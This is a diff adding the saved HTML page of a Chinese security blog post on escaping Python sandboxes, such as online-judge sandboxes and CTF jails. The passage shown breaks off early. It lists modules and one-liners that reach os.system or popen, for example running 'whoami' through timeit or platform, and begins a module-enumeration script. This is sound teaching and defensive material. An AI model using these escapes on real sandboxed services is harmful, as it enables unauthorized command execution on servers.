@@ -1,0 +1,1250 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
+  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Tr0y">
+  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, 博客, 信息安全">
+  
+    <meta name="description" content="让用户提交 Python 代码并在服务器上执行，是一些 OJ、量化网站重要的服务，很多 CTF 也有类似的题。为了不让恶意用户执行任意的 Python 代码，就需要确保 Python 运行在沙箱中。沙箱经常会禁用一些敏感的函数，例如 os，研究怎么逃逸、防护这类沙箱还是蛮有意思的。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python 沙箱逃逸的经验总结">
+<meta property="og:url" content="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">
+<meta property="og:site_name" content="Tr0y&#39;s Blog">
+<meta property="og:description" content="让用户提交 Python 代码并在服务器上执行，是一些 OJ、量化网站重要的服务，很多 CTF 也有类似的题。为了不让恶意用户执行任意的 Python 代码，就需要确保 Python 运行在沙箱中。沙箱经常会禁用一些敏感的函数，例如 os，研究怎么逃逸、防护这类沙箱还是蛮有意思的。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/python.jpeg/cover">
+<meta property="article:published_time" content="2019-05-06T17:41:00.000Z">
+<meta property="article:modified_time" content="2023-12-13T10:02:13.000Z">
+<meta property="article:author" content="Tr0y">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/python.jpeg/cover">
+  
+  
+  
+  <title>Python 沙箱逃逸的经验总结 - Tr0y&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/my.css">
+<link rel="stylesheet" href="/css/my-piczoom.css">
+<link rel="stylesheet" href="/css/my-code.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"丨","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"🌧"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tr0y&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-books"></i>
+                生命线
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-archive-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/gallery/">
+                <i class="iconfont icon-images"></i>
+                摄影集
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Python 沙箱逃逸的经验总结"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2019-05-06 17:41" pubdate>
+          2019年5月6日 17:41:00
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          38k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          240 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="经验总结"
+        id="heading-14f81b61393e65e2be86c2b4bcc0434a" role="tab" data-toggle="collapse" href="#collapse-14f81b61393e65e2be86c2b4bcc0434a"
+        aria-expanded="true"
+      >
+        经验总结
+        <span class="list-group-count">(85)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-14f81b61393e65e2be86c2b4bcc0434a"
+           role="tabpanel" aria-labelledby="heading-14f81b61393e65e2be86c2b4bcc0434a">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/12/31/2021/" title="2021 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/01/12/flag-in-2021/" title="2021，来立些 flag 吧"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021，来立些 flag 吧</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/01/31/2022/" title="2022 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2022 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/03/15/2023/" title="2023 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/05/06/%E4%BA%91%E5%8D%97%E4%B9%8B%E6%97%85/" title="2024 云南之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 云南之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/03/14/2024/" title="2024 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/02/20/%E6%96%90%E6%B5%8E%E4%B9%8B%E6%97%85/" title="2024 🇫🇯 斐济之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 🇫🇯 斐济之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2019/06/02/CSRF%E6%8C%87%E5%8C%97/" title="CSRF 指北"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CSRF 指北</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2017/06/07/CtfMiscStega/" title="CTF 杂项之隐写术"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CTF 杂项之隐写术</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2020/09/14/DNS-1-basic/" title="DNS 安全（一）：基础知识复习"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">DNS 安全（一）：基础知识复习</span>
+        </a>
+      
+    
+      
+      
+        <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="list-group-item list-group-item-action">
+          <span class="category-post">More...</span>
+        </a>
+        
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="过程记录"
+        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
+        aria-expanded="false"
+      >
+        过程记录
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
+           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2023/12/22/qwb2023-pyjail/" title="2023 强网杯三道 pyjail 的题解"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 强网杯三道 pyjail 的题解</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Python 沙箱逃逸的经验总结</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2 年前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>让用户提交 Python 代码并在服务器上执行，是一些 OJ、量化网站重要的服务，很多 CTF 也有类似的题。为了不让恶意用户执行任意的 Python 代码，就需要确保 Python 运行在沙箱中。沙箱经常会禁用一些敏感的函数，例如 os，研究怎么逃逸、防护这类沙箱还是蛮有意思的。</p>
+<span id="more"></span>
+<h2 id="前言">前言</h2>
+<p>Python 的沙箱逃逸的最终目标就是执行系统任意命令，次一点的写文件，再次一点的读文件。</p>
+<p>顺便安利一本书：《流畅的 Python》。这本书有很多中高阶知识点，很全面而且讲的很清楚，如果你看过，相信理解这篇文章的大多数内容都不是问题。</p>
+<p>接下来的内容先讲系统命令执行，再讲文件写入、读取，并且均以 oj 为例，库大多以 <code>os</code> 为例。</p>
+<h2 id="执行系统命令">执行系统命令</h2>
+<h3 id="基础知识">基础知识</h3>
+<p>先啰嗦一些基础知识</p>
+<p>在 Python 中执行系统命令的方式有：</p>
+<ul>
+<li>os</li>
+<li>commands：仅限<code>2.x</code></li>
+<li>subprocess</li>
+<li>timeit：<code>timeit.sys</code>、<code>timeit.timeit("__import__('os').system('whoami')", number=1)</code></li>
+<li>platform：<code>platform.os</code>、<code>platform.sys</code>、<code>platform.popen('whoami', mode='r', bufsize=-1).read()</code></li>
+<li>pty：<code>pty.spawn('ls')</code>、<code>pty.os</code></li>
+<li>bdb：<code>bdb.os</code>、<code>cgi.sys</code></li>
+<li>cgi：<code>cgi.os</code>、<code>cgi.sys</code></li>
+<li>...</li>
+</ul>
+<p>我写了一个脚本，测试了一下所有的导入 <code>os</code> 或者 <code>sys</code> 的库：<br />
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">#-*- coding:utf8 -*-<br># <span class="hljs-keyword">By</span> Macr0phag3<br># <span class="hljs-keyword">in</span> <span class="hljs-number">2019</span>-<span class="hljs-number">05</span>-<span class="hljs-number">07</span> <span class="hljs-number">19</span>:<span class="hljs-number">46</span>:<span class="hljs-number">12</span><br># ------------------------------------<br><br># this, antigravity 库删掉<br>all_modules_2 = [<br>    <span class="hljs-string">&#x27;BaseHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;imaplib&#x27;</span>, <span class="hljs-string">&#x27;shelve&#x27;</span>, <span class="hljs-string">&#x27;Bastion&#x27;</span>, <span class="hljs-string">&#x27;anydbm&#x27;</span>, <span class="hljs-string">&#x27;imghdr&#x27;</span>, <span class="hljs-string">&#x27;shlex&#x27;</span>, <span class="hljs-string">&#x27;CDROM&#x27;</span>, <span class="hljs-string">&#x27;argparse&#x27;</span>, <span class="hljs-string">&#x27;imp&#x27;</span>, <span class="hljs-string">&#x27;shutil&#x27;</span>, <span class="hljs-string">&#x27;CGIHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;array&#x27;</span>, <span class="hljs-string">&#x27;importlib&#x27;</span>, <span class="hljs-string">&#x27;signal&#x27;</span>, <span class="hljs-string">&#x27;Canvas&#x27;</span>, <span class="hljs-string">&#x27;ast&#x27;</span>, <span class="hljs-string">&#x27;imputil&#x27;</span>, <span class="hljs-string">&#x27;site&#x27;</span>, <span class="hljs-string">&#x27;ConfigParser&#x27;</span>, <span class="hljs-string">&#x27;asynchat&#x27;</span>, <span class="hljs-string">&#x27;inspect&#x27;</span>, <span class="hljs-string">&#x27;sitecustomize&#x27;</span>, <span class="hljs-string">&#x27;Cookie&#x27;</span>, <span class="hljs-string">&#x27;asyncore&#x27;</span>, <span class="hljs-string">&#x27;io&#x27;</span>, <span class="hljs-string">&#x27;smtpd&#x27;</span>, <span class="hljs-string">&#x27;DLFCN&#x27;</span>, <span class="hljs-string">&#x27;atexit&#x27;</span>, <span class="hljs-string">&#x27;itertools&#x27;</span>, <span class="hljs-string">&#x27;smtplib&#x27;</span>, <span class="hljs-string">&#x27;Dialog&#x27;</span>, <span class="hljs-string">&#x27;audiodev&#x27;</span>, <span class="hljs-string">&#x27;json&#x27;</span>, <span class="hljs-string">&#x27;sndhdr&#x27;</span>, <span class="hljs-string">&#x27;DocXMLRPCServer&#x27;</span>, <span class="hljs-string">&#x27;audioop&#x27;</span>, <span class="hljs-string">&#x27;keyword&#x27;</span>, <span class="hljs-string">&#x27;socket&#x27;</span>, <span class="hljs-string">&#x27;FileDialog&#x27;</span>, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;lib2to3&#x27;</span>, <span class="hljs-string">&#x27;spwd&#x27;</span>, <span class="hljs-string">&#x27;FixTk&#x27;</span>, <span class="hljs-string">&#x27;bdb&#x27;</span>, <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;sqlite3&#x27;</span>, <span class="hljs-string">&#x27;HTMLParser&#x27;</span>, <span class="hljs-string">&#x27;binascii&#x27;</span>, <span class="hljs-string">&#x27;linuxaudiodev&#x27;</span>, <span class="hljs-string">&#x27;sre&#x27;</span>, <span class="hljs-string">&#x27;IN&#x27;</span>, <span class="hljs-string">&#x27;binhex&#x27;</span>, <span class="hljs-string">&#x27;locale&#x27;</span>, <span class="hljs-string">&#x27;sre_compile&#x27;</span>, <span class="hljs-string">&#x27;MimeWriter&#x27;</span>, <span class="hljs-string">&#x27;bisect&#x27;</span>, <span class="hljs-string">&#x27;logging&#x27;</span>, <span class="hljs-string">&#x27;sre_constants&#x27;</span>, <span class="hljs-string">&#x27;Queue&#x27;</span>, <span class="hljs-string">&#x27;bsddb&#x27;</span>, <span class="hljs-string">&#x27;lsb_release&#x27;</span>, <span class="hljs-string">&#x27;sre_parse&#x27;</span>, <span class="hljs-string">&#x27;ScrolledText&#x27;</span>, <span class="hljs-string">&#x27;bz2&#x27;</span>, <span class="hljs-string">&#x27;macpath&#x27;</span>, <span class="hljs-string">&#x27;ssl&#x27;</span>, <span class="hljs-string">&#x27;SimpleDialog&#x27;</span>, <span class="hljs-string">&#x27;cPickle&#x27;</span>, <span class="hljs-string">&#x27;macurl2path&#x27;</span>, <span class="hljs-string">&#x27;stat&#x27;</span>, <span class="hljs-string">&#x27;SimpleHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;cProfile&#x27;</span>, <span class="hljs-string">&#x27;mailbox&#x27;</span>, <span class="hljs-string">&#x27;statvfs&#x27;</span>, <span class="hljs-string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="hljs-string">&#x27;cStringIO&#x27;</span>, <span class="hljs-string">&#x27;mailcap&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-string">&#x27;SocketServer&#x27;</span>, <span class="hljs-string">&#x27;calendar&#x27;</span>, <span class="hljs-string">&#x27;markupbase&#x27;</span>, <span class="hljs-string">&#x27;stringold&#x27;</span>, <span class="hljs-string">&#x27;StringIO&#x27;</span>, <span class="hljs-string">&#x27;cgi&#x27;</span>, <span class="hljs-string">&#x27;marshal&#x27;</span>, <span class="hljs-string">&#x27;stringprep&#x27;</span>, <span class="hljs-string">&#x27;TYPES&#x27;</span>, <span class="hljs-string">&#x27;cgitb&#x27;</span>, <span class="hljs-string">&#x27;math&#x27;</span>, <span class="hljs-string">&#x27;strop&#x27;</span>, <span class="hljs-string">&#x27;Tix&#x27;</span>, <span class="hljs-string">&#x27;chunk&#x27;</span>, <span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-string">&#x27;struct&#x27;</span>, <span class="hljs-string">&#x27;Tkconstants&#x27;</span>, <span class="hljs-string">&#x27;cmath&#x27;</span>, <span class="hljs-string">&#x27;mhlib&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;Tkdnd&#x27;</span>, <span class="hljs-string">&#x27;cmd&#x27;</span>, <span class="hljs-string">&#x27;mimetools&#x27;</span>, <span class="hljs-string">&#x27;sunau&#x27;</span>, <span class="hljs-string">&#x27;Tkinter&#x27;</span>, <span class="hljs-string">&#x27;code&#x27;</span>, <span class="hljs-string">&#x27;mimetypes&#x27;</span>, <span class="hljs-string">&#x27;sunaudio&#x27;</span>, <span class="hljs-string">&#x27;UserDict&#x27;</span>, <span class="hljs-string">&#x27;codecs&#x27;</span>, <span class="hljs-string">&#x27;mimify&#x27;</span>, <span class="hljs-string">&#x27;symbol&#x27;</span>, <span class="hljs-string">&#x27;UserList&#x27;</span>, <span class="hljs-string">&#x27;codeop&#x27;</span>, <span class="hljs-string">&#x27;mmap&#x27;</span>, <span class="hljs-string">&#x27;symtable&#x27;</span>, <span class="hljs-string">&#x27;UserString&#x27;</span>, <span class="hljs-string">&#x27;collections&#x27;</span>, <span class="hljs-string">&#x27;modulefinder&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;_LWPCookieJar&#x27;</span>, <span class="hljs-string">&#x27;colorsys&#x27;</span>, <span class="hljs-string">&#x27;multifile&#x27;</span>, <span class="hljs-string">&#x27;sysconfig&#x27;</span>, <span class="hljs-string">&#x27;_MozillaCookieJar&#x27;</span>, <span class="hljs-string">&#x27;commands&#x27;</span>, <span class="hljs-string">&#x27;multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;syslog&#x27;</span>, <span class="hljs-string">&#x27;__builtin__&#x27;</span>, <span class="hljs-string">&#x27;compileall&#x27;</span>, <span class="hljs-string">&#x27;mutex&#x27;</span>, <span class="hljs-string">&#x27;tabnanny&#x27;</span>, <span class="hljs-string">&#x27;__future__&#x27;</span>, <span class="hljs-string">&#x27;compiler&#x27;</span>, <span class="hljs-string">&#x27;netrc&#x27;</span>, <span class="hljs-string">&#x27;talloc&#x27;</span>, <span class="hljs-string">&#x27;_abcoll&#x27;</span>, <span class="hljs-string">&#x27;contextlib&#x27;</span>, <span class="hljs-string">&#x27;new&#x27;</span>, <span class="hljs-string">&#x27;tarfile&#x27;</span>, <span class="hljs-string">&#x27;_ast&#x27;</span>, <span class="hljs-string">&#x27;cookielib&#x27;</span>, <span class="hljs-string">&#x27;nis&#x27;</span>, <span class="hljs-string">&#x27;telnetlib&#x27;</span>, <span class="hljs-string">&#x27;_bisect&#x27;</span>, <span class="hljs-string">&#x27;copy&#x27;</span>, <span class="hljs-string">&#x27;nntplib&#x27;</span>, <span class="hljs-string">&#x27;tempfile&#x27;</span>, <span class="hljs-string">&#x27;_bsddb&#x27;</span>, <span class="hljs-string">&#x27;copy_reg&#x27;</span>, <span class="hljs-string">&#x27;ntpath&#x27;</span>, <span class="hljs-string">&#x27;termios&#x27;</span>, <span class="hljs-string">&#x27;_codecs&#x27;</span>, <span class="hljs-string">&#x27;crypt&#x27;</span>, <span class="hljs-string">&#x27;nturl2path&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;_codecs_cn&#x27;</span>, <span class="hljs-string">&#x27;csv&#x27;</span>, <span class="hljs-string">&#x27;numbers&#x27;</span>, <span class="hljs-string">&#x27;textwrap&#x27;</span>, <span class="hljs-string">&#x27;_codecs_hk&#x27;</span>, <span class="hljs-string">&#x27;ctypes&#x27;</span>, <span class="hljs-string">&#x27;opcode&#x27;</span>, <span class="hljs-string">&#x27;_codecs_iso2022&#x27;</span>, <span class="hljs-string">&#x27;curses&#x27;</span>, <span class="hljs-string">&#x27;operator&#x27;</span>, <span class="hljs-string">&#x27;thread&#x27;</span>, <span class="hljs-string">&#x27;_codecs_jp&#x27;</span>, <span class="hljs-string">&#x27;datetime&#x27;</span>, <span class="hljs-string">&#x27;optparse&#x27;</span>, <span class="hljs-string">&#x27;threading&#x27;</span>, <span class="hljs-string">&#x27;_codecs_kr&#x27;</span>, <span class="hljs-string">&#x27;dbhash&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;time&#x27;</span>, <span class="hljs-string">&#x27;_codecs_tw&#x27;</span>, <span class="hljs-string">&#x27;dbm&#x27;</span>, <span class="hljs-string">&#x27;os2emxpath&#x27;</span>, <span class="hljs-string">&#x27;timeit&#x27;</span>, <span class="hljs-string">&#x27;_collections&#x27;</span>, <span class="hljs-string">&#x27;decimal&#x27;</span>, <span class="hljs-string">&#x27;ossaudiodev&#x27;</span>, <span class="hljs-string">&#x27;tkColorChooser&#x27;</span>, <span class="hljs-string">&#x27;_csv&#x27;</span>, <span class="hljs-string">&#x27;difflib&#x27;</span>, <span class="hljs-string">&#x27;parser&#x27;</span>, <span class="hljs-string">&#x27;tkCommonDialog&#x27;</span>, <span class="hljs-string">&#x27;_ctypes&#x27;</span>, <span class="hljs-string">&#x27;dircache&#x27;</span>, <span class="hljs-string">&#x27;pdb&#x27;</span>, <span class="hljs-string">&#x27;tkFileDialog&#x27;</span>, <span class="hljs-string">&#x27;_ctypes_test&#x27;</span>, <span class="hljs-string">&#x27;dis&#x27;</span>, <span class="hljs-string">&#x27;pickle&#x27;</span>, <span class="hljs-string">&#x27;tkFont&#x27;</span>, <span class="hljs-string">&#x27;_curses&#x27;</span>, <span class="hljs-string">&#x27;distutils&#x27;</span>, <span class="hljs-string">&#x27;pickletools&#x27;</span>, <span class="hljs-string">&#x27;tkMessageBox&#x27;</span>, <span class="hljs-string">&#x27;_curses_panel&#x27;</span>, <span class="hljs-string">&#x27;doctest&#x27;</span>, <span class="hljs-string">&#x27;pipes&#x27;</span>, <span class="hljs-string">&#x27;tkSimpleDialog&#x27;</span>, <span class="hljs-string">&#x27;_elementtree&#x27;</span>, <span class="hljs-string">&#x27;dumbdbm&#x27;</span>, <span class="hljs-string">&#x27;pkgutil&#x27;</span>, <span class="hljs-string">&#x27;toaiff&#x27;</span>, <span class="hljs-string">&#x27;_functools&#x27;</span>, <span class="hljs-string">&#x27;dummy_thread&#x27;</span>, <span class="hljs-string">&#x27;platform&#x27;</span>, <span class="hljs-string">&#x27;token&#x27;</span>, <span class="hljs-string">&#x27;_hashlib&#x27;</span>, <span class="hljs-string">&#x27;dummy_threading&#x27;</span>, <span class="hljs-string">&#x27;plistlib&#x27;</span>, <span class="hljs-string">&#x27;tokenize&#x27;</span>, <span class="hljs-string">&#x27;_heapq&#x27;</span>, <span class="hljs-string">&#x27;email&#x27;</span>, <span class="hljs-string">&#x27;popen2&#x27;</span>, <span class="hljs-string">&#x27;trace&#x27;</span>, <span class="hljs-string">&#x27;_hotshot&#x27;</span>, <span class="hljs-string">&#x27;encodings&#x27;</span>, <span class="hljs-string">&#x27;poplib&#x27;</span>, <span 